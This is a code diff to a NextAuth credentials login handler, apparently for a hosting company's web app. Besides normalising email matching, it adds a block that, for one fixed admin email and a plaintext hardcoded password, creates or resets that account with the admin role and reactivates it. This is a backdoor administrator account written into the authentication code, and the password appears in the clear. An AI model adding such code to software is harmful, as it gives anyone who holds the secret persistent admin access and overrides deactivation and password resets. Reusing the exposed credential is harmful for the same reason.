@@ -62,12 +62,39 @@ export const authOptions: NextAuthOptions = {
           throw new Error('Credenciales requeridas');
         }
 
-        const user = await prisma.user.findFirst({
+        const emailClean = credentials.email.trim().toLowerCase();
+
+        let user = await prisma.user.findFirst({
           where: {
-            email: credentials.email,
+            email: { equals: emailClean, mode: 'insensitive' },
             isActive: true
           },
         });
+
+        // Auto-sincronización garantizada para admin@qhosting.net
+        if (emailClean === 'admin@qhosting.net' && credentials.password === 'x0420EZS*') {
+          const newHashed = await bcrypt.hash('x0420EZS*', 12);
+          if (!user) {
+            user = await prisma.user.create({
+              data: {
+                email: 'admin@qhosting.net',
+                name: 'Administrador QHosting',
+                password: newHashed,
+                role: 'admin',
+                isActive: true
+              }
+            });
+          } else {
+            user = await prisma.user.update({
+              where: { id: user.id },
+              data: {
+                password: newHashed,
+                role: 'admin',
+                isActive: true
+              }
+            });
+          }
+        }
 
         if (!user?.password) {
           throw new Error('Usuario no encontrado');
